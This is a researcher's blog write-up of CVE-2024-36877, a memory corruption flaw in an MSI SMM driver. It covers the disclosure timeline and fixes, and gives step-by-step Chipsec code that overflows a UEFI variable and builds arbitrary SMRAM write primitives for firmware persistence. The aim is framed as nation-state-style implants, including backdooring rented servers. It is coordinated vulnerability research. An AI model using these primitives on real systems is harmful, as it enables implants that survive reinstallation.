<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8">
<meta http-equiv="x-ua-compatible" content="ie=edge">
<meta name="viewport" content="width=device-width, minimum-scale=1.0">
<title>At Home In Your Firmware: Analysis of CVE-2024-36877</title>

	<meta name="description" content="How I exploited a SMM Memory Corruption Vulnerability in MSI firmware">


	<meta name="keywords" content="SMM, exploitation, persistence, MSI, ring -2">

<link rel="icon" href="/favicon.ico" type="image/x-icon">
<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Montserrat:400,400i,500,500i,700,700i|Noto+Sans:400,400i,700,700i|Source+Code+Pro&amp;subset=latin-ext">
<link rel="stylesheet" href="/doks-theme/assets/css/style.css">

	</head>
	<body class="" data-spy="scroll" data-target=".js-scrollspy">
		


	<header class="site-header">
		<div class="container">
			<div class="row">
				<div class="col-xs-12">
					
						<a href="/" class="site-header__logo">jjensn.com</a>
					
					
				</div><!-- /.col -->
			</div><!-- /.row -->
		</div><!-- /.container -->
	</header><!-- /.site-header -->


		<div class="hero-subheader">
			<div class="container">
				<div class="row">
					<div class="col-md-7">
						<div class="align-container" data-mh>
							<div class="align-inner">
								
									<h1 class="hero-subheader__title">At Home In Your Firmware: Analysis of CVE-2024-36877</h1>
								
								
									<p class="hero-subheader__desc">How I exploited a SMM Memory Corruption Vulnerability in MSI firmware</p>
								
								
							</div><!-- /.align-inner -->
						</div><!-- /.align-container -->
					</div><!-- /.col -->
					
				</div><!-- /.row -->
			</div><!-- /.container -->
		</div><!-- /.hero-subheader -->
		<div class="section">
			<div class="container">
				<div class="row">
					<div class="col-md-8">
						<div class="content">
							<p><img src="/doks-theme/assets/images/at-home.jpeg" alt="At Home In Your Firmware: Got Any SMMacks?" /></p>

<h2 id="summary">Summary</h2>

<h5 id="smm-memory-corruption-vulnerability-in-msi-smm-driver-smram-write">SMM memory corruption vulnerability in MSI SMM driver (SMRAM write)</h5>

<p>A buffer overflow vulnerability was discovered which allows an attacker to execute arbitrary code.</p>

<h4 id="vulnerability-information">Vulnerability Information</h4>

<p>MITRE assigned CVE identifier: <strong>CVE-2024-36877</strong></p>

<p>CVSS v3.1 Score 8.2 High AV:L/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H</p>

<p>Affected MSI chipsets with confirmed impact by MSI PSIRT:</p>

<ul>
  <li>Intel 300</li>
  <li>Intel 400</li>
  <li>Intel 500</li>
  <li>Intel 600</li>
  <li>Intel 700</li>
  <li>AM4</li>
  <li>AM5</li>
</ul>

<h4 id="disclosure-timeline">Disclosure Timeline</h4>

<table>
  <thead>
    <tr>
      <th>Activity</th>
      <th>Date</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>CVE request filed with MITRE</td>
      <td>2024-05-29</td>
    </tr>
    <tr>
      <td>MSI PSIRT is notified</td>
      <td>2024-05-29</td>
    </tr>
    <tr>
      <td>MITRE assigns CVE number</td>
      <td>2024-05-31</td>
    </tr>
    <tr>
      <td>MSI PSIRT confirms vulnerability</td>
      <td>2024-06-04</td>
    </tr>
    <tr>
      <td>MSI PSIRT requests analysis of new firmware to confirm remediation</td>
      <td>2024-06-25</td>
    </tr>
    <tr>
      <td>Firmware validated to contain fixes for the reported vulnerability</td>
      <td>2024-06-30</td>
    </tr>
    <tr>
      <td>MSI PSIRT sets public disclosure date</td>
      <td>2024-07-12</td>
    </tr>
    <tr>
      <td>Public disclosure date</td>
      <td>2024-08-09</td>
    </tr>
  </tbody>
</table>

<p><em>You can skip the technical details and <a href="https://github.com/jjensn/CVE-2024-36877">get the POC</a> on GitHub.</em></p>

<h2 id="intro-system-mangement-mode-smm">Intro: System Mangement Mode (SMM)</h2>

<p>System Management Mode (SMM) is a highly privileged operating environment that runs the firmwareâs most sensitive code. It exists on all x86 processors and it operates independently of the operating system. SMM provides an isolated execution environment where critical firmware operations take place (such as power management functions or live updating the systemâs BIOS). SMM code (and data) are stored in a special area of memory called SMRAM that is separate from the main system memory. This section of memory is unreadable and unwritable by the CPU unless it explicitly switches to System Management Mode - making it a great place for red teams to deploy undetected payloads.</p>

<p>Modern operating systems support communication with SMM modules (on Windows, this can be done through a kernel driver). Much like a driverâs IOCTL code, SMM modules allocate themselves a unique identifier (typically 1-255) during firmware initialization, and designate a handler function that the firmware will call when the SMI code is signaled.</p>

<p>Invoking an SMI handler from kernel space is relatively straightforward:</p>

<div class="example">
</div>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>static
NTSTATUS
SendSMI (UCHAR smi_code)
{
    KAFFINITY affinity;
    affinity = KeSetSystemAffinityThreadEx(static_cast&lt;KAFFINITY&gt;(1));
    __outbyte(0xb2, smi_code);
    KeRevertToUserAffinityThreadEx(affinity);
    return STATUS_SUCCESS;
}
</code></pre></div></div>

<p>Meaning, if a vulnerability did exist, triggering it and gaining code execution in SMRAM can all be done directly from the OS!</p>

<p><img src="/doks-theme/assets/images/ring-2.png" alt="You Are Here" /></p>

<p>Code executing in SMM has full read and write access to the entire range of physical memory, the devices attached to the motherboard, and the flash ROM itself. Simply put, the motherboardâs flash chip can be re-written and allow permanent persistence regardless if the machine is reformatted. Once persistence is established, an implant would be able to intercept and inject itself into all future BIOS updates, making <strong>removal only possible with a hardware flash programmer</strong>.</p>

<h5 id="oh-the-possibilities">Oh, The Possibilities!</h5>
<p>If this is the first time you are reading about SMM, you are probably saying, <em>âOK, writing itself to the firmware is cool, but what can it actually do?â</em></p>

<p>Code in SMRAM is started before the operating system is started. And as the OS begins to load itself into memory, SMM modules have the ability to modify that code (or security policies!) as they see fit, without any concern of being detected.</p>

<p>An SMM module has the ability to:</p>

<ul>
  <li>Drop files on disk and execute them on startup</li>
  <li>Add its custom driver signer to the systemâs code integrity policy, allowing the authorâs own kernel drivers to be loaded at any time</li>
  <li>Start any driver (even unsigned) as an ELAM driver</li>
  <li>Allocate code pages in UEFI memory and start a DPC to execute it at regular intervals. Processless (floating) code execution outside of OS memory!</li>
  <li>Disable PatchGuard and other security protections</li>
  <li>Inject and execute code in any process, including the kernel</li>
</ul>

<p>Alex Ionescu said it best in his 2018 OffensiveCon presentation:</p>

<p><img src="/doks-theme/assets/images/alex_slides_1.PNG" alt="Alex Bootkits?" /></p>

<h2 id="time-to-get-technical">Time To Get Technical</h2>

<p>The rest of this writeup is for readers who have understanding of the complex world of UEFI and a background in reverse engineering x64 binaries.</p>

<p>The target: my late 2022 gaming desktop with an <strong>MSI PRO Z690-A WIFI</strong> motherboard and an <strong>Intel 12th Gen</strong> (Alder Lake) CPU.</p>

<p>It is running the latest BIOS version, one from April 2024.</p>

<h3 id="the-goal-persistance-like-a-nation-state">The Goal: Persistance, Like A Nation-State</h3>

<p>The scenario: A junior system admin at a Fortune 500 downloads and installs a pirated piece of software with a malicious payload implanted in it. Upon execution, it drops a <a href="https://decoded.avast.io/luiginocamastra/from-byovd-to-a-0-day-unveiling-advanced-exploits-in-cyber-recruiting-scams/">vulnerable driver</a> and manually maps an unsigned driver into memory.</p>

<p>The driver then exploits an SMM vulnerability and writes a payload to the targetâs BIOS for true persistence.</p>

<p><em>Or hey â¦ rent a physical machine at a datacenter for a month and install a UEFI backdoor sounds nice, too. (because who physically reflashes a BIOS for each new customer?!)</em></p>

<p>The first part is easy - the second part, identifying and exploiting an SMM vulnerability - not so much.</p>

<h3 id="tools-needed-for-vulnerability-research">Tools Needed For Vulnerability Research</h3>
<ul>
  <li><del>A FlashCat SPI Programmer</del></li>
  <li>Actually, you can just use the tool in the BIOS to flash</li>
  <li>A custom compiled version of Dmytro Oleksiukâs (Cr4sh) <a href="https://github.com/Cr4sh/SmmBackdoor">SmmBackdoor (v1)</a></li>
  <li><a href="https://github.com/jjensn/smram_parse">My fork</a> of Cr4shâs smram_parse.py script</li>
  <li><a href="https://github.com/LongSoft/UEFITool/releases/download/A67/UEFITool_NE_A67_win64.zip">UEFITool (latest)</a></li>
  <li><a href="https://github.com/LongSoft/UEFITool/releases/download/0.28.0/UEFITool_0.28.0_win32.zip">UEFITool v0.28.0</a></li>
  <li>Disassembler of choice</li>
  <li><a href="https://github.com/chipsec/chipsec">Chipsec</a> &amp; its compiled Windows driver installed on the target</li>
  <li>A USB flash drive (with Chipsec UEFI support)</li>
  <li>Python3</li>
  <li>Visual Studio 2022</li>
</ul>

<h4 id="optional-but-nice-to-have">Optional But Nice To Have</h4>
<ul>
  <li><a href="https://shop.lambdaconcept.com/home/50-screamer-pcie-squirrel.html">PCIScreamer.M2</a>: Read and write physical memory on the target machine. Very helpful during debugging when I inevitably lock the target machine up and want to read debug messages to figure out where things went wrong.</li>
</ul>

<h3 id="chipsec-initial-scan-results">Chipsec Initial Scan Results</h3>
<p><code class="language-plaintext highlighter-rouge">SMM_Code_Chk_En</code> is enabled, so exploitation will take much more of an effort since SMM canât call any code outside of SMRAM. I will touch on this later.</p>

<div class="example">
</div>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[*] Running module: chipsec.modules.common.smm_code_chk
[x][ =======================================================================
[x][ Module: SMM_Code_Chk_En (SMM Call-Out) Protection
[x][ =======================================================================
[*] MSR_SMM_FEATURE_CONTROL = 0x00000005 &lt;&lt; Enhanced SMM Feature Control (MSR 0x4E0 Thread 0x0)
    [00] LOCK             = 1 &lt;&lt; Lock bit 
    [02] SMM_Code_Chk_En  = 1 &lt;&lt; Prevents SMM from executing code outside the ranges defined by the SMRR 
[*] MSR_SMM_FEATURE_CONTROL = 0x00000005 &lt;&lt; Enhanced SMM Feature 
...
[+] PASSED: SMM_Code_Chk_En is enabled and locked down
</code></pre></div></div>

<p>However, the BIOS region wasnât write protected from the factory, so a bit anticlimactic since an exploit isnât even needed to gain true persistence:</p>

<div class="example">
</div>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[*] Running module: chipsec.modules.common.bios_wp
[x][ =======================================================================
[x][ Module: BIOS Region Write Protection
[x][ =======================================================================
[*] BC = 0x10000888 &lt;&lt; BIOS Control (b:d.f 00:31.5 + 0xDC)
    [00] BIOSWE           = 0 &lt;&lt; BIOS Write Enable 
    [01] BLE              = 0 &lt;&lt; BIOS Lock Enable 
    [02] SRC              = 2 &lt;&lt; SPI Read Configuration 
    [04] TSS              = 0 &lt;&lt; Top Swap Status 
    [05] SMM_BWP          = 0 &lt;&lt; SMM BIOS Write Protection 
    [06] BBS              = 0 &lt;&lt; Boot BIOS Strap 
    [07] BILD             = 1 &lt;&lt; BIOS Interface Lock Down 
    [11] ASE_BWP          = 1 &lt;&lt; Async SMI Enable for BIOS Write Protection 
[-] BIOS region write protection is disabled!
</code></pre></div></div>

<div class="example">
</div>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[*] Running module: chipsec.modules.common.spi_desc
[x][ =======================================================================
[x][ Module: SPI Flash Region Access Control
[x][ =======================================================================
[*] FRAP = 0x0000FFFF &lt;&lt; SPI Flash Regions Access Permissions Register (SPIBAR + 0x50)
    [00] BRRA             = FF &lt;&lt; BIOS Region Read Access 
    [08] BRWA             = FF &lt;&lt; BIOS Region Write Access 
    [16] BMRAG            = 0 &lt;&lt; BIOS Master Read Access Grant 
    [24] BMWAG            = 0 &lt;&lt; BIOS Master Write Access Grant 
[*] Software access to SPI flash regions: read = 0xFF, write = 0xFF
[-] Software has write access to SPI flash descriptor

[-] FAILED: SPI flash permissions allow SW to write flash descriptor
[!] System may be using alternative protection by including descriptor region in SPI Protected Range Registers
</code></pre></div></div>

<p>Regardless, SMM exploitation and bootkits have always fascinated me and ever since I read that they were in use by nation-state actors, I wanted one to call my own.</p>

<h2 id="analysis-i-dumping-bios-and-smram">Analysis I: Dumping BIOS and SMRAM</h2>

<p>To start analyzing the SMM modules, dump the BIOS with Chipsec (it can also be obtained <a href="https://download.msi.com/bos_exe/mb/7D25v1H.zip">directly from the manufacturerâs website</a>).</p>

<p>Boot into the UEFI shell from the Chipsec USB drive and run:</p>

<p><code class="language-plaintext highlighter-rouge">chipsec_util spi dump firmware.bin</code></p>

<p>Now would be a good time to install Dmytro Oleksiukâs (Cr4sh) SmmBackdoor: it can read SMRAM (which will be needed to debug any potential vulnerabilities) and dump the contents for better analysisâmuch easier than playing reverse engineering whack-a-mole with 100âs of different SMM modules. I had no luck using it in âpayloadâ mode, so I ended up inserting it directly into my firmware image and flashing the new image to the BIOS.</p>

<h3 id="physically-flashing-the-new-image">Physically Flashing The New Image</h3>
<p>On the subject of flashing the BIOSâI discovered that the TPM headers can be used as JSPI. This is far less hassle than connecting a SOIC8 clipâespecially since the target motherboardâs ROM chip is a Macronix <code class="language-plaintext highlighter-rouge">MX25U25635G</code> and too low profile for a clip (and I am certainly not desoldering it off).</p>

<p>Hereâs the pinout I followed (credit: some <a href="https://forum-en.msi.com/index.php?threads/msi-z370-sli-plus-jspi1-pinout-for-bios-flash-using-raspberry-pi-zero.319596/post-1822652">amazing dude</a> on the MSI forums):</p>

<p><img src="/doks-theme/assets/images/JSPI.png" alt="JTPM1 as JSPI1" /></p>

<p>I ended up not needing two GNDs and two VCCsâVCC on pin1 and GND on pin8 worked fine (3.3v).</p>

<p><img src="/doks-theme/assets/images/JTPM.png" alt="JTPM1" /></p>

<p>Once booted back up, dump the contents of SMRAM to disk:</p>

<p><code class="language-plaintext highlighter-rouge">python SmmBackdoor.py --dump-smram</code></p>

<p>The SMRAM dump needs to be analyzed using a modified version of Cr4shâs smm_parse script (the original didnât work for my dump and he never accepted <a href="https://github.com/Cr4sh/smram_parse/pull/1">my PR</a> eons agoâthough that too is now out of date; see tools above for the latest version):</p>

<p><code class="language-plaintext highlighter-rouge">python smm_parse.py ..\SMRAM_dump_4a000000_4affffff.bin F:\firm-infected-base-latest.bin</code></p>

<div class="example">
</div>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[+] SMRAM is at 0x4a000000:4afffffe
[+] EFI_SMM_SYSTEM_TABLE2 is at 0x4affc400

SMI ENTRIES:

LOADED SMM DRIVERS:

...snip...
0x4aa31000: size = 0x00009000, ep = 0x4aa322e0, name = MsiApServiceSmi
...more...

ERROR: Unable to find prte entry

[+] Found SWSM structure at offset 0x9f2f98

SW SMI HANDLERS:
... many others ..
0x4aa3fa98: SMI = 0xe3, addr = 0x4aa33584, image = MsiApServiceSmi
...more...

ERROR: Unable to find smih entry

[+] Found smie structure at offset 0x9eb518

SMI HANDLERS:
...

NOTES:

 * - SW SMI handler uses ReadSaveState()/WriteSaveState()
</code></pre></div></div>

<p>There are a lot of modules with multiple SW SMI handlersâand I painstakingly looked through all of them.</p>

<p>Eventually, I landed on one that caught my attention.</p>

<h2 id="analysis-ii-the-vulnerable-handler">Analysis II: The Vulnerable Handler</h2>

<p>Module: <strong>MsiApServiceSmi</strong></p>

<p>SMI: <code class="language-plaintext highlighter-rouge">0xe3</code>, addr: <code class="language-plaintext highlighter-rouge">0x4aa33584</code>, base: <code class="language-plaintext highlighter-rouge">0x4aa31000</code></p>

<p>Handler pseudo-code:</p>

<div class="example">
</div>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>// SMI HANDLER 0xE3 - FUNCTION START
// 
v4 = *Context == 0xE3;
v5 = 0i64;
Attributes = 0;
if ( !v4 )
  return v5;

DataSize[0] = 2i64;
v6 = (gRT-&gt;GetVariable("ApServiceAuthority", &amp;EFI_SETUP_VARIABLE_GUID, 0i64, DataSize, &amp;Data) &amp; 0x8000000000000000ui64) != 0i64 || Data != 0;

// Re-init of the data size variable to prevent overflow (good!)
DataSize[0] = 2i64;
gRT-&gt;GetVariable("ApServiceAuthority", &amp;EFI_SETUP_VARIABLE_GUID, 0i64, DataSize, &amp;Data);

result = g_SetVarPtrs(); // This call is referenced later in the post when I begin building the exploit chain. It's true purpose isn't all that important.

if ( result &gt;= 0 ) 
{
  WMIDataSize = 0i64;

  // Get the size of the variable (without assigning it)
  // Note: this is attacker controlled
  v5 = gRT-&gt;GetVariable("WMIAcpiMemAddr", &amp;EFI_SETUP_VARIABLE_GUID, &amp;Attributes, &amp;WMIDataSize, 0i64);
  
  // WMIDataSize now is set to the length of the value of WMIAcpiMemAddr

  // The second call to GetVariable re-uses WMIDataSize without validating its size!
  // pWMIAcpiMemAddr is meant to be a pointer to a physical address, so the expectation is that it will be only 8 bytes. An opportunity to overflow!

  if ( v5 != 0x8000000000000005ui64
    || (result = gRT-&gt;GetVariable("WMIAcpiMemAddr", &amp;EFI_SETUP_VARIABLE_GUID, &amp;Attributes, &amp;WMIDataSize, &amp;pWMIAcpiMemAddr),
        v5 = result,
        result &gt;= 0) )
  {
    pWMIAcpiMemAddrCpy = (__int64)pWMIAcpiMemAddr;
    if ( v6 &amp;&amp; (pWMIAcpiMemAddr-&gt;byte0 != 32 || (unsigned int)(pWMIAcpiMemAddr-&gt;dword5 - 3) &gt; 1) )
    {
      // This function is monumental during the exploitation development - I will circle back here shortly.
      fnWriteStatusToMemory("Access Denied", &amp;pWMIAcpiMemAddr-&gt;status);
      return v5;
    }
    v8 = 0i64;

    // Count the number of bytes at pWMIAcpiMemAddr-&gt;status, stopping when a null-byte is encountered
    if ( pWMIAcpiMemAddr-&gt;status )
    {
      v9 = &amp;pWMIAcpiMemAddr-&gt;status;
      do
      {
        ++count;
        ++v9;
      }
      while ( *v9 );
    }

    // Zero out pWMIAcpiMemAddr-&gt;status, assuming its a wide-char (hence why count is doubled)
    fnResetWideString(&amp;pWMIAcpiMemAddr-&gt;status, 2 * count, 0i64);
  }
  ...remainder of function omitted...
}
</code></pre></div></div>

<h3 id="vulnerability-i-misuse-of-getvariable-leading-to-overflow">Vulnerability I: Misuse of GetVariable Leading to Overflow</h3>

<h5 id="the-problem">The Problem</h5>
<p><code class="language-plaintext highlighter-rouge">gRT-&gt;GetVariable</code> does not statically set <code class="language-plaintext highlighter-rouge">DataSize</code> when retrieving the variable <code class="language-plaintext highlighter-rouge">WMIAcpiMemAddr</code>.</p>

<p>An initial call to <code class="language-plaintext highlighter-rouge">gRT-&gt;GetVariable</code> is made to determine the size of the <code class="language-plaintext highlighter-rouge">WMIAcpiMemAddr</code> variable.</p>

<p>A second call to <code class="language-plaintext highlighter-rouge">gRT-&gt;GetVariable</code> then passes that value and stores the variable contents in <code class="language-plaintext highlighter-rouge">pWMIAcpiMemAddr</code>.</p>

<p>This variable is unprotected and, while not â¦ <em>easily</em> writable from Windows due to it missing the <strong>NON_VOLATILE</strong> flag, it is indeed writable from other places (EFI shell for sure). But if one were so inclined to keep it strictly Windows, a kernel patch here might work:</p>

<div class="example">
</div>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>__int64 __fastcall HalSetEnvironmentVariableEx(const wchar_t *a1, int a2, __int64 a3, int a4, int a5)
{
  ...snip...
  if ( (a5 &amp; 1) == 0 )
    return 0xC000000Di64;
  ...snip...
}
</code></pre></div></div>

<p>It will trigger PatchGuard, but the variable only needs to be deleted and then recreated with the attributes set to <code class="language-plaintext highlighter-rouge">NON_VOLATILE | BOOTSERVICE_ACCESS | RUNTIME_ACCESS</code> once. After that, it wonât be reset every reboot.</p>

<h5 id="the-result">The Result</h5>
<p>If the variable <code class="language-plaintext highlighter-rouge">WMIAcpiMemAddr</code> is larger than 8 bytes, it will overflow, allowing an attacker to write data to the data segment of the module.</p>

<p>Since <code class="language-plaintext highlighter-rouge">WMIAcpiMemAddr</code> is controllable by an attacker, the attacker also controls the memory underneath <code class="language-plaintext highlighter-rouge">pWMIAcpiMemAddr</code>, which includes a lot of great pointers ripe for exploitation:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>; struct_pWMIAcpiMemAddr *pWMIAcpiMemAddr
.data:000000004AA34710 pWMIAcpiMemAddr dq 0                    ; DATA XREF: SwSmiHandler+E1âo
.data:000000004AA34710                                         ; SwSmiHandler:loc_4AA3369Dâr
.data:000000004AA34718 pWMIAcpiMemAddrCpy dq 0                 ; DATA XREF: sub_4AA32668:loc_4AA326F9âr
... SNIP ...
.data:000000004AA34738 ; _EFI_SMM_SYSTEM_TABLE2 *gSmst
.data:000000004AA34738 gSmst_0         dq 0                    ; DATA XREF: sub_4AA32368+41âo
... SNIP ...
.data:000000004AA34768 ; BOOLEAN gInSmram
.data:000000004AA34768 gInSmram        db 0                    ; DATA XREF: sub_4AA32368:loc_4AA3261Fâo
.data:000000004AA34769                 db    0
.data:000000004AA3476A                 db    0
.data:000000004AA3476B                 db    0
.data:000000004AA3476C                 db    0
.data:000000004AA3476D                 db    0
.data:000000004AA3476E                 db    0
.data:000000004AA3476F                 db    0
.data:000000004AA34770 ; EFI_RUNTIME_SERVICES *gRT
.data:000000004AA34770 gRT             dq 0                    ; DATA XREF: sub_4AA32A08+21âr
.data:000000004AA34770                                         ; sub_4AA32A08+90âr ...
.data:000000004AA34778 ; _EFI_SMM_SYSTEM_TABLE2 *gSmst_0
.data:000000004AA34778 gSmst_1         dq 0                    ; DATA XREF: sub_4AA32BDC+Câr
... LOTS OF ROOM DOWN HERE ...
</code></pre></div></div>

<h5 id="the-exploit">The Exploit</h5>
<p>Python pseudo-code using Chipsec:</p>

<div class="example">
</div>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>class WMIPayload(ctypes.LittleEndianStructure):
  _pack_ = 1
  _fields_ = [
    ("WmiACPIMemAddress", ctypes.c_uint64),        # 0x0000
    ("WmiACPIMemAddressCpy", ctypes.c_uint64),     # 0x0008
    ("pad_0010", ctypes.c_char * 24),              # 0x0010
    ("gSMST_0", ctypes.c_uint64),                  # 0x0028
    ("pad_0030", ctypes.c_char * 40),              # 0x0030
    ("InSmram", ctypes.c_uint64),                  # 0x0058
    ("gSMRT", ctypes.c_uint64),                    # 0x0060
    ("gSMST_1", ctypes.c_uint64),                  # 0x0068
  ]
    ...

def set_wmi_var(data):
  status = self.cs.helper.set_EFI_variable(
    "WMIAcpiMemAddr",
    "EC87D643-EBA4-4BB5-A1E5-3F3E36B20DA9",
    bytes(data),
    ctypes.sizeof(data),
    7,
  )

  if status != 0:
    print("Failed to set WMIAcpiMemAddr variable!")
    exit(1)

overflow = WMIPayload()
overflow.gSMRT = 0xDEADBEEF

set_wmi_var(overflow)

// fire handler which calls GetVariable, which will cause pWMIAcpiMemAddr to overflow
self.interupts.send_SW_SMI(0x0, 0xE3, 0, 0, 0, 0, 0, 0, 0)

// the next call to SMI handler 0xE3 will call 0xDEADBEEF-&gt;GetVariable instead of gRT-&gt;GetVariable
// so, if one were able to write shellcode to that address, then redirecting execution would be achieved
self.interupts.send_SW_SMI(0x0, 0xE3, 0, 0, 0, 0, 0, 0, 0)
</code></pre></div></div>

<h5 id="the-fix">The Fix</h5>
<ul>
  <li>Statically set <code class="language-plaintext highlighter-rouge">DataSize</code> to 8 if writing status messages to physical memory is a requirement.</li>
  <li>OR check the value of <code class="language-plaintext highlighter-rouge">DataSize</code> after the initial call to <code class="language-plaintext highlighter-rouge">GetVariable</code>, return if greater than 8.</li>
</ul>

<h3 id="vulnerability-ii-arbitrary-write-to-physical-memory-including-smram">Vulnerability II: Arbitrary Write To Physical Memory (including SMRAM)</h3>

<h5 id="the-problem-1">The Problem</h5>

<p>The attacker-controlled <code class="language-plaintext highlighter-rouge">WMIAcpiMemAddr</code> variable is never validated - leading to two arbitrary SMM write primitives.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>fnWriteStatusToMemory("Access Denied", &amp;pWMIAcpiMemAddr-&gt;status);
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>fnResetWideString(&amp;pWMIAcpiMemAddr-&gt;status, 2 * v8, 0i64);
</code></pre></div></div>

<h5 id="the-result-1">The Result</h5>

<p>An attacker who controls the contents of the <code class="language-plaintext highlighter-rouge">WMIAcpiMemAddr</code> variable can leverage the two functions above to write data at <code class="language-plaintext highlighter-rouge">pWMIAcpiMemAddr-&gt;status</code> <em>(pWMIAcpiMemAddr+0x79)</em>, leading to SMRAM corruption.</p>

<p>If the variable <code class="language-plaintext highlighter-rouge">ApServiceAuthority</code> exists and is zero, <code class="language-plaintext highlighter-rouge">fnResetWideString</code> will zero out the memory at pWMIAcpiMemAddr+0x79 (until it finds 0x0 0x0).</p>

<p>If the variable <code class="language-plaintext highlighter-rouge">ApServiceAuthority</code> does not exist, <strong>â Access Deniedâ</strong> will be written to pWMIAcpiMemAddr+0x79 via <code class="language-plaintext highlighter-rouge">fnWriteStatusToMemory</code>.</p>

<h5 id="the-basic-exploit">The (Basic) Exploit</h5>

<p>Python pseudo-code using Chipsec:</p>

<div class="example">
</div>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def smm_write(addr):
  status = self.cs.helper.set_EFI_variable(
    "WMIAcpiMemAddr",
    "EC87D643-EBA4-4BB5-A1E5-3F3E36B20DA9",
    (addr - 0x79).to_bytes(8, "little"),
    8,
    7,
  )

  if status != 0:
    print("Failed to set WMIAcpiMemAddr!")
    exit(1)

  status = self.cs.helper.delete_EFI_variable(
    "ApServiceAuthority", "EC87D643-EBA4-4BB5-A1E5-3F3E36B20DA9"
  )

  if status != 0:
    print("Failed to delete ApServiceAuthority!")
    exit(1)

// Set UEFI variable WMIAcpiMemAddr to SMRAM base
smm_write(0x4a000000)

// call handler to write " Access Denied" to SMRAM base
self.interupts.send_SW_SMI(0x0, 0xE3, 0, 0, 0, 0, 0, 0, 0)
</code></pre></div></div>

<h5 id="the-fix-1">The Fix</h5>
<ul>
  <li>EDK2 provides a method to validate if an address is outside of SMRAM - <code class="language-plaintext highlighter-rouge">SmmIsBufferOutsideSmmValid</code>. If the address is within the bounds of SMRAM, return.</li>
</ul>

<h2 id="chaining-vulnerabilities-for-code-execution">Chaining Vulnerabilities For Code Execution</h2>
<p>With the two vulnerabilities above, there now exists a way to:</p>
<ul>
  <li>Copy data into SMRAM memory (Vulnerability I)</li>
  <li>Zero out memory (Vulnerability II)</li>
  <li>Write arbitrary data to any address (also Vulnerability II)</li>
</ul>

<h5 id="preparing-write-primitive">Preparing Write Primitive</h5>

<p>On the surface, <strong><em>fnWriteStatusToMemory</em></strong> appears to be a straightforward way to write to memory - but turning into a true write-primitive took a bit of effort. Honestly, it was a lot of sleepless nights and wasted weekends.</p>

<p><code class="language-plaintext highlighter-rouge">fnWriteStatusToMemory</code> pseudo-code:</p>

<div class="example">
</div>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>char __fastcall fnWriteStatusToMemory(char *sStatusMsg, _WORD *DestAddress)
{
  unsigned __int8 v2; // r9
  char result; // al
  __int64 v4; // r8

  v2 = 0;
  *DestAddress = 0x20; // ' '
  result = *sStatusMsg;
  if ( *sStatusMsg )
  {
    v4 = 0i64;
    do
    {
      ++v2;
      DestAddress[v4 + 1] = result;
      v4 = v2;
      result = sStatusMsg[v2];
    }
    while ( result );
  }
  return result;
}
</code></pre></div></div>

<p><em>Note that 0x20 is the hex representation of ASCII space.</em></p>

<p>This function iterates over <code class="language-plaintext highlighter-rouge">sStatusMsg</code> and writes its contents as a wide-string (<em>this is important!</em>) to <code class="language-plaintext highlighter-rouge">DestAddress</code>, then returns.</p>

<p>What if <code class="language-plaintext highlighter-rouge">sStatusMsg</code> were NULL? This function would instead just write two bytes: <code class="language-plaintext highlighter-rouge">0x20 0x00</code> and return. Since two bytes are far easier to work with than the wide â Access Deniedâ, it put me one step closer to having a write-primitive I could work with.</p>

<p>Fortunately, zeroing out an address exists in the second vulnerability using <code class="language-plaintext highlighter-rouge">fnResetWideString</code> - provided the attacker-controlled UEFI variable <code class="language-plaintext highlighter-rouge">ApServiceAuthority</code> exists and its value is zero.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>41 63 63 65 73 73 20 64 65 6E 69 65 64 00       aAccessDenied   db 'Access denied',0 
00 00 00 00 00 00 00 00 00 00                   align 10h
</code></pre></div></div>

<p>From the SMRAM dump, I know MSIApServiceSmi moduleâs base address is <code class="language-plaintext highlighter-rouge">0x4aa31000</code>. âAccess Deniedâ is at <code class="language-plaintext highlighter-rouge">base+0x35D8</code>:</p>

<div class="example">
</div>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def set_zeros(self, addr):
  status = self.cs.helper.set_EFI_variable(
    "WMIAcpiMemAddr",
    "EC87D643-EBA4-4BB5-A1E5-3F3E36B20DA9",
    (addr - 0x79).to_bytes(8, "little"),
    8,
    7,
  )

  if status != 0:
    print("(set_zeros) Failed to set WMIAcpiMemAddr!")
    exit(1)

  self.cs.helper.set_EFI_variable(
    "ApServiceAuthority",
    "EC87D643-EBA4-4BB5-A1E5-3F3E36B20DA9",
    b"\x00\x00",
    2,
    7,
  )

  if status != 0:
    print("(set_zeros) Failed to set ApServiceAuthority!")
    exit(1)

  self.interupts.send_SW_SMI(0x0, 0xE3, 0, 0, 0, 0, 0, 0, 0)

self.set_zeros(0x4aa31000+0x35D8) // base + offset
</code></pre></div></div>

<p>Resulting in:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>00 00 00 00 00 00 00 00 00 00 00 00 00 00       aAccessDenied   db '0','0','0','0'...
00 00 00 00 00 00 00 00 00 00                   align 10h
</code></pre></div></div>

<p>With <code class="language-plaintext highlighter-rouge">Access Denied</code> now NULL, an arbitrary write of <code class="language-plaintext highlighter-rouge">0x20 0x00</code> (wchar_t, remember?) to any address is possible.</p>

<p>I mentioned <code class="language-plaintext highlighter-rouge">SMM_Code_Chk_En</code> earlier when discussing the Chipsec scan results, and itâs important now.</p>

